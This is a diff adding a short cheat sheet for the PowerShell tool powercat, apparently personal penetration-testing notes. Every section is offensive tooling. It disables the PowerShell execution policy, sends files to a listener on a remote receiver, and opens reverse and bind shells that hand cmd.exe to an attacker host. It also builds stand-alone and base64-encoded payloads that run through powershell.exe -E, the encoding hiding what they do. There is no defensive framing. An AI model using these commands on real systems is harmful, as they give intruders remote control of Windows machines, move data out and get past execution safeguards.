@@ -1,0 +1,45 @@
+=========================
+remove restriction policy
+=========================
+Set-ExecutionPolicy Unrestricted
+
+====
+load
+====
+. .\powercat.ps1
+
+=============
+file transfer
+=============
+sender
+	powercat -c <receiver ip> -p <receiver port> -i <filename>
+
+receiver
+	sudo nc -nvlp <port> > <filename>
+
+=============
+reverse shell
+=============
+attacker
+	open listening port
+victim
+	powercat -c <attacker ip> -p <attacker port> -e cmd.exe
+
+==========
+bind shell
+==========
+attacker
+	connect to the victim
+victim
+	powercat -l -p <victim port> -e cmd.exe
+
+===================
+stand-alone payload
+===================
+make ps1 file
+	powercat -c <attacker ip> -p <attacker port> -e cmd.exe -g > <filename>
+base64 encrypted payload
+	1. powercat -c <attacker ip> -p <attacker port> -e cmd.exe -ge > <filename>
+	2. copy the encoded code
+	3. powershell.exe -E <copied code>
+	
